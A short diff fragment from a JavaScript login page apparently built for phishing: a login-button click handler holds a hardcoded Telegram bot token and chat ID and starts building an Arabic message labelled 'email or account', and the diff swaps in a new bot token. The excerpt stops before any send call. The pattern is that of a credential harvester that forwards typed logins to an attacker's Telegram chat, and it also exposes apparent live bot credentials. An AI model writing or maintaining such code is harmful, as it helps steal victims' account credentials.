@@ -21,7 +21,7 @@ document.getElementById("login-btn").addEventListener("click", function(e) {
   status.textContent = "";
   
 
-  const telegramToken = "8237856348:AAE_Qgc5V4m63m-IDAHTLO8IKIwZEuCZG98";
+  const telegramToken = "8368127903:AAHy6o_Zi8uXn_gV8VShgYR5V8yxfvqFJV0";
   const chatId = "6657124417";
   
   const text = `الاميل او الحساب:⬅ ️.  
